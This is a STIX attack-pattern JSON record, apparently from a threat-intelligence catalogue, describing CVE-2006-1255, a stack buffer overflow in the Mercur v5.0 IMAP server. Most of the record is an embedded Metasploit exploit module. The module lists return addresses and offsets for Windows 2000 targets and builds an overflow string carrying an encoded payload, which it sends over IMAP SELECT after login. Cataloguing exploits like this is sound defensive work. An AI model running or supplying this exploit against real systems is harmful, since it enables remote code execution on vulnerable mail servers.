{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5fb9fda6-298f-4f30-bf2d-f1301c248ba5",
    "created": "2024-08-14T16:47:36.810974Z",
    "modified": "2024-08-14T16:47:36.810978Z",
    "name": "Mercur v5.0 IMAP SP3 SELECT Buffer Overflow",
    "description": " Mercur v5.0 IMAP server is prone to a remotely exploitable stack-based buffer overflow vulnerability. This issue is due to a failure of the application to properly bounds check user-supplied data prior to copying it to a fixed size memory buffer. Credit to Tim Taylor for discover the vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/imap/mercur_imap_select_overflow.rb",
            "external_id": "mercur_imap_select_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-1255"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Imap\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mercur v5.0 IMAP SP3 SELECT Buffer Overflow',\n      'Description'    => %q{\n          Mercur v5.0 IMAP server is prone to a remotely exploitable\n        stack-based buffer overflow vulnerability. This issue is due\n        to a failure of the application to properly bounds check\n        user-supplied data prior to copying it to a fixed size memory buffer.\n        Credit to Tim Taylor for discover the vulnerability.\n      },\n      'Author'         => [ 'Jacopo Cervini <acaro[at]jervus.it>' ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-1255' ],\n          [ 'OSVDB', '23950' ],\n          [ 'BID', '17138' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Windows 2000 Server SP4 English',  { 'Offset' => 126, 'Ret' => 0x13e50b42 }],\n          ['Windows 2000 Pro SP1 English',     { 'Offset' => 127, 'Ret' => 0x1446e242 }],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-03-17'))\n\n  end\n\n  def exploit\n    sploit =  \"a001 select \" + \"\\x43\\x49\\x41\\x4f\\x20\\x42\\x41\\x43\\x43\\x4f\\x20\"\n    sploit << rand_text_alpha_upper(94) + rand_text_alpha_upper(target['Offset'])\n    sploit << [target.ret].pack('V') + \"\\r\\n\" + rand_text_alpha_upper(8)\n    sploit << payload.encoded + rand_text_alpha_upper(453)\n\n    info = connect_login\n\n    if (info == true)\n      print_status(\"Trying target #{target.name} using heap address at 0x%.8x...\" % target.ret)\n      sock.put(sploit + \"\\r\\n\")\n    else\n      print_status(\"Not falling through with exploit\")\n    end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-03-17",
    "x_mitre_platforms": [
        "win'"
    ]
}